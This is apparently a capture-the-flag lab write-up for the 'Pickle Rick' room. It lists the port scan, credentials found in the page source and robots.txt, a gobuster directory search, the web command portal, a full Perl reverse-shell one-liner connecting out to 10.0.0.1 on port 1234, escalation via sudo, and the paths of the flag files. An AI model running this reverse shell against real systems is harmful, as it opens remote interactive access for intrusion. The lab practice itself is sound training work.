# Pickle Rick
```
export ip=10.10.32.170 
```
## SCAN
```
22 ssh
80 http

```

## Credential
```
ID : http://10.10.32.170 --> View Page Source
Password :  http://10.10.32.170/robots.txt
```

## HTTP
```
1. gobuster
--> login.php
```

## Gaining Access
```
1. http://10.10.32.170/portal.php

[REVERSE SHELL] : PERL
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Privilege Escalate
```
1. sudo su --> get a root 
```

## Ingredient PATH
```
#1 cat /var/www/html/Sup3rS3cretPickl3Ingred.txt

#2 strings /home/rick/second\ ingredients

#3 cat /root/3rd.txt
```